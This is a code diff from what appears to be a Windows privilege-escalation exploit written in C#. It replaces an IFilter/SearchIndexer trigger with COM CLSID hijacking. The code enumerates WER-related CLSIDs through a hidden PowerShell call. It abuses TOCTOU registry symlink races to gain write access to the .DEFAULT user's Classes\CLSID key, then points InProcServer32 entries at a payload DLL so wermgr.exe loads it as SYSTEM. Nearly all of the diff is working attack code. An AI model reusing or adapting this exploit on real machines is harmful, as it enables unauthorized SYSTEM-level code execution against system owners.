@@ -280,79 +280,60 @@ if($r-eq 0){
             NtClose(hTK);
         }
 
-        /* IFilter registration in .DEFAULT\Software\Classes via TOCTOU runs */
-        const string EP_GUID   = "{EEB02C9D-1234-5678-ABCD-EF0123456789}";
-        const string EP_EXT    = ".eptest";
+        /* COM CLSID hijacking: enumerate wer*.dll CLSIDs in HKLM, override in .DEFAULT\Software\Classes.
+           COM checks HKCU (= HKU\.DEFAULT for SYSTEM) BEFORE HKLM for InProcServer32.
+           wermgr.exe calls CoCreateInstance on these CLSIDs -> loads our DLL as SYSTEM. */
         string clsidParent = string.Join("\\", _reg, "Software","Classes","CLSID");
-        string clsidKey    = clsidParent + "\\" + EP_GUID;
-        string inprocKey   = clsidKey + "\\InProcServer32";
-        string extKey      = string.Join("\\", _reg, "Software","Classes",EP_EXT);
-        string phKey       = extKey + "\\PersistentHandler";
 
-        /* TOCTOU 3: make .DEFAULT\Software\Classes\CLSID world-writable.
-           If it doesn't exist the driver creates it fresh with anonymous DACL.
-           Either way we get KEY_ALL_ACCESS on it. */
+        /* Find all WER-related CLSIDs in HKLM */
+        string enumPs =
+            "Get-ChildItem HKLM:\\SOFTWARE\\Classes\\CLSID | ForEach-Object {" +
+            "  try{$v=(Get-ItemProperty \"$($_.PSPath)\\InprocServer32\" '(default)' -EA Ignore).'(default)';" +
+            "  if($v -and ($v -match 'wer|Wer|WER')){Write-Host $_.PSChildName}}catch{}}";
+        var epsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
+            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{enumPs}\"")
+            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true};
+        string werClsids = "";
+        using(var p=System.Diagnostics.Process.Start(epsi)) {
+            werClsids = p.StandardOutput.ReadToEnd(); p.WaitForExit(15000);
+        }
+        string[] guids = werClsids.Split(new[]{'\r','\n'}, StringSplitOptions.RemoveEmptyEntries);
+        Console.WriteLine($"[+] WER CLSIDs in HKLM: {guids.Length}");
+
+        /* TOCTOU 3: make .DEFAULT\Software\Classes\CLSID world-writable */
         RecDelete(BA); Thread.Sleep(300);
         CreateSymlinkPS(BA, clsidParent);
         Console.Write("    TOCTOU(CLSID): "); RunToctou();
 
-        /* With CLSID now world-writable, create {EP_GUID}\InProcServer32 ourselves */
-        {
-            IntPtr hClsid = OKey(clsidParent, KEY_ALL_ACCESS);
-            Console.WriteLine($"[dbg] CLSID open: {(hClsid==IntPtr.Zero?"FAIL":"OK")}");
-            if (hClsid != IntPtr.Zero) {
-                IntPtr hGuid; uint disp;
-                var oa = new OA(clsidKey, OBJ_CASE_INSENSITIVE);
-                int r = NtCreateKey(out hGuid, KEY_ALL_ACCESS, ref oa, 0, IntPtr.Zero, 0, out disp);
-                oa.Free();
-                Console.WriteLine($"[dbg] GUID key: 0x{r:X8}");
-                if (r==0 && hGuid!=IntPtr.Zero) {
-                    IntPtr hInproc; uint disp2;
-                    var oa2 = new OA(inprocKey, OBJ_CASE_INSENSITIVE);
-                    int r2 = NtCreateKey(out hInproc, KEY_ALL_ACCESS, ref oa2, 0, IntPtr.Zero, 0, out disp2);
-                    oa2.Free();
-                    Console.WriteLine($"[dbg] InProcServer32: 0x{r2:X8}");
-                    if (r2==0 && hInproc!=IntPtr.Zero) {
+        IntPtr hClsid = OKey(clsidParent, KEY_ALL_ACCESS);
+        Console.WriteLine($"[dbg] CLSID key open: {(hClsid==IntPtr.Zero?"FAIL":"OK")}");
+
+        if (hClsid != IntPtr.Zero) {
+            int hijacked = 0;
+            foreach (string guid in guids) {
+                string g = guid.Trim();
+                if (g.Length == 0) continue;
+                string gKey = clsidParent + "\\" + g;
+                string ipKey = gKey + "\\InProcServer32";
+                IntPtr hG; uint d1;
+                var oaG = new OA(gKey, OBJ_CASE_INSENSITIVE);
+                if (NtCreateKey(out hG, KEY_ALL_ACCESS, ref oaG, 0, IntPtr.Zero, 0, out d1)==0 && hG!=IntPtr.Zero) {
+                    IntPtr hI; uint d2;
+                    var oaI = new OA(ipKey, OBJ_CASE_INSENSITIVE);
+                    if (NtCreateKey(out hI, KEY_ALL_ACCESS, ref oaI, 0, IntPtr.Zero, 0, out d2)==0 && hI!=IntPtr.Zero) {
                         var vn=new US(""); var wb=System.Text.Encoding.Unicode.GetBytes(dllPath+"\0");
-                        NtSetValueKey(hInproc,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
+                        NtSetValueKey(hI,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
                         var tm=new US("ThreadingModel"); var tb=System.Text.Encoding.Unicode.GetBytes("Both\0");
-                        NtSetValueKey(hInproc,ref tm,0,REG_SZ,tb,tb.Length); tm.Free();
-                        NtClose(hInproc);
-                        Console.WriteLine($"[+] InProcServer32 = {dllPath}");
+                        NtSetValueKey(hI,ref tm,0,REG_SZ,tb,tb.Length); tm.Free();
+                        NtClose(hI); hijacked++;
                     }
-                    NtClose(hGuid);
+                    oaI.Free(); NtClose(hG);
                 }
-                NtClose(hClsid);
+                oaG.Free();
             }
+            NtClose(hClsid);
+            Console.WriteLine($"[+] Hijacked {hijacked}/{guids.Length} WER CLSIDs -> {dllPath}");
         }
-
-        /* TOCTOU 4: create .DEFAULT\Software\Classes\.eptest world-writable */
-        RecDelete(BA); Thread.Sleep(300);
-        CreateSymlinkPS(BA, extKey);
-        Console.Write("    TOCTOU(EXT): "); RunToctou();
-
-        /* Create PersistentHandler subkey pointing to our CLSID */
-        {
-            var oa = new OA(phKey, OBJ_CASE_INSENSITIVE);
-            IntPtr hK; uint disp;
-            int r = NtCreateKey(out hK, KEY_ALL_ACCESS, ref oa, 0, IntPtr.Zero, 0, out disp);
-            oa.Free();
-            if (r==0 && hK!=IntPtr.Zero) {
-                var vn=new US(""); var wb=System.Text.Encoding.Unicode.GetBytes(EP_GUID+"\0");
-                NtSetValueKey(hK,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
-                NtClose(hK);
-                Console.WriteLine($"[+] .eptest PersistentHandler = {EP_GUID}");
-            } else Console.WriteLine($"[-] PersistentHandler create failed: 0x{r:X8}");
-        }
-
-        /* Drop trigger file in Documents - SearchIndexer will pick it up and load our IFilter */
-        string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-        string triggerFile = Path.Combine(docs, "ep_trigger.eptest");
-        File.WriteAllText(triggerFile, "EasyPlasma");
-        Console.WriteLine($"[+] Trigger: {triggerFile}");
-        /* Notify shell so SearchIndexer sees the new file immediately */
-        SHChangeNotify(0x00000002 /*SHCNE_CREATE*/, 0x0005 /*SHCNF_PATHW*/, triggerFile, IntPtr.Zero);
-        Console.WriteLine("[*] SearchIndexer notified, waiting for DLL load...");
 
         /* WER fallback: still try in case wermgr.exe actually loads our DLLs */
         PreparePayload(runDir);
